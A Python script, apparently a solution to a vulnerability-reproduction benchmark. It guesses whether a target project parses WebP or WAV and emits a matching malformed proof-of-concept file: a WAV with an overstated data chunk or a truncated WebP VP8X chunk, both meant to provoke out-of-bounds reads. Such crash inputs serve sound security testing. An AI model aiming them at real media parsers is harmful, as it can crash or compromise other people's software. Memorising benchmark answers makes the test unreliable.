import os
import re
import struct
import tarfile
from typing import Dict, Iterable, Optional, Tuple


def _u32(x: int) -> bytes:
    return struct.pack("<I", x & 0xFFFFFFFF)


def _make_wav_poc(total_len: int = 58, data_claim: int = 64, data_payload_len: int = 14) -> bytes:
    # RIFF WAVE + fmt(16) + data(claimed bigger than present)
    # Total: 12 + (8+16) + 8 + data_payload_len = 44 + data_payload_len
    if total_len != 44 + data_payload_len:
        data_payload_len = max(0, total_len - 44)
        total_len = 44 + data_payload_len

    riff_size = total_len - 8

    # PCM 8-bit mono
    audio_format = 1
    num_channels = 1
    sample_rate = 8000
    bits_per_sample = 8
    block_align = num_channels * (bits_per_sample // 8)
    byte_rate = sample_rate * block_align

    fmt_payload = struct.pack(
        "<HHIIHH",
        audio_format,
        num_channels,
        sample_rate,
        byte_rate,
        block_align,
        bits_per_sample,
    )
    assert len(fmt_payload) == 16

    data_payload = b"\x00" * data_payload_len

    out = bytearray()
    out += b"RIFF"
    out += _u32(riff_size)
    out += b"WAVE"
    out += b"fmt "
    out += _u32(16)
    out += fmt_payload
    out += b"data"
    out += _u32(data_claim)
    out += data_payload
    return bytes(out)


def _make_webp_poc_min() -> bytes:
    # Minimal RIFF WEBP with VP8X chunk claiming 10 bytes but providing none.
    # Length = 20 bytes, RIFF size = 12 bytes (WEBP + chunk header only)
    out = bytearray()
    out += b"RIFF"
    out += _u32(12)          # file_len - 8
    out += b"WEBP"
    out += b"VP8X"
    out += _u32(10)          # required payload size, but payload omitted
    return bytes(out)


def _iter_tar_text_blobs(t: tarfile.TarFile, max_files: int = 400, max_total: int = 3_000_000) -> Iterable[Tuple[str, bytes]]:
    exts = (
        ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx",
        ".inc", ".inl", ".ipp", ".m", ".mm",
        ".go", ".rs", ".java", ".kt",
        ".py", ".js", ".ts",
        ".cmake", ".txt", ".md", ".rst", ".yaml", ".yml",
        ".bazel", ".bzl",
        "makefile", "cmakelists.txt",
    )
    total = 0
    count = 0
    for m in t.getmembers():
        if count >= max_files or total >= max_total:
            break
        if not m.isfile():
            continue
        name = m.name
        lname = name.lower()
        base = os.path.basename(lname)
        if not (base.endswith(exts) or any(lname.endswith(e) for e in exts)):
            continue
        if m.size <= 0 or m.size > 400_000:
            continue
        try:
            f = t.extractfile(m)
            if f is None:
                continue
            data = f.read()
        except Exception:
            continue
        if not data:
            continue
        total += len(data)
        count += 1
        yield (name, data)


def _iter_dir_text_blobs(root: str, max_files: int = 400, max_total: int = 3_000_000) -> Iterable[Tuple[str, bytes]]:
    exts = {
        ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx",
        ".inc", ".inl", ".ipp", ".m", ".mm",
        ".go", ".rs", ".java", ".kt",
        ".py", ".js", ".ts",
        ".cmake", ".txt", ".md", ".rst", ".yaml", ".yml",
        ".bazel", ".bzl",
    }
    total = 0
    count = 0
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            if count >= max_files or total >= max_total:
                return
            lfn = fn.lower()
            ext = os.path.splitext(lfn)[1]
            if ext not in exts and lfn not in ("makefile", "cmakelists.txt"):
                continue
            path = os.path.join(dirpath, fn)
            try:
                st = os.stat(path)
                if st.st_size <= 0 or st.st_size > 400_000:
                    continue
                with open(path, "rb") as f:
                    data = f.read()
            except Exception:
                continue
            if not data:
                continue
            total += len(data)
            count += 1
            yield (path, data)


def _score_indicators_from_blob(name: str, data: bytes) -> Dict[str, int]:
    lname = name.lower()
    webp = 0
    wave = 0

    # Path hints
    if "webp" in lname or "vp8" in lname:
        webp += 10
    if "wav" in lname or "wave" in lname:
        wave += 10

    # Content hints
    webp += data.count(b"WEBP") * 6
    webp += data.count(b"WebP") * 3
    webp += data.count(b"VP8X") * 6
    webp += data.count(b"VP8L") * 6
    webp += data.count(b"VP8 ") * 4
    webp += data.count(b"VP8") * 2
    webp += data.count(b"webp/") * 2

    wave += data.count(b"WAVE") * 6
    wave += data.count(b"fmt ") * 6
    wave += data.count(b"data") * 2
    wave += data.count(b"wav") * 1
    wave += data.count(b"wave") * 1

    # Fuzzer entrypoint weighting
    if b"LLVMFuzzerTestOneInput" in data:
        webp += data.count(b"WebP") * 8 + data.count(b"WEBP") * 8 + data.count(b"VP8") * 6
        wave += data.count(b"WAVE") * 8 + data.count(b"fmt ") * 8 + data.count(b"RIFF") * 2

    return {"webp": webp, "wave": wave}


def _detect_format(src_path: str) -> str:
    # Fast heuristics from filename
    p = src_path.lower()
    if "webp" in p:
        return "webp"
    if "wav" in p or "wave" in p or "sndfile" in p:
        return "wave"

    scores = {"webp": 0, "wave": 0}

    # Try tarball
    if os.path.isfile(src_path):
        try:
            with tarfile.open(src_path, "r:*") as t:
                for name, data in _iter_tar_text_blobs(t):
                    s = _score_indicators_from_blob(name, data)
                    scores["webp"] += s["webp"]
                    scores["wave"] += s["wave"]
        except Exception:
            pass
    elif os.path.isdir(src_path):
        for name, data in _iter_dir_text_blobs(src_path):
            s = _score_indicators_from_blob(name, data)
            scores["webp"] += s["webp"]
            scores["wave"] += s["wave"]

    # Decide
    if scores["webp"] == 0 and scores["wave"] == 0:
        return "wave"
    return "webp" if scores["webp"] >= scores["wave"] else "wave"


class Solution:
    def solve(self, src_path: str) -> bytes:
        fmt = _detect_format(src_path)
        if fmt == "webp":
            return _make_webp_poc_min()
        return _make_wav_poc(total_len=58, data_claim=64, data_payload_len=14)